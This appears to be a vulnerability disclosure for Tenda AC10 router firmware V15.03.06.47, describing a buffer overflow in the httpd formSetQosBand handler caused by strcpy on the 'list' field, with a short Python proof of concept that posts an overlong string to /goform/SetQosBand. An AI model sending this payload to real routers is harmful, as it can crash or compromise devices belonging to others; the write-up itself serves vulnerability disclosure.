# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/formSetQosBand

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](9.png)

get value from list ,then call setQosMiblist

![](10.png)

p equal list, if list have '\n', get into while

then call strcpy, cause buff overflow

## POC
```
url = "http://192.168.1.13/goform/SetQosBand"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list': payload})
``` 
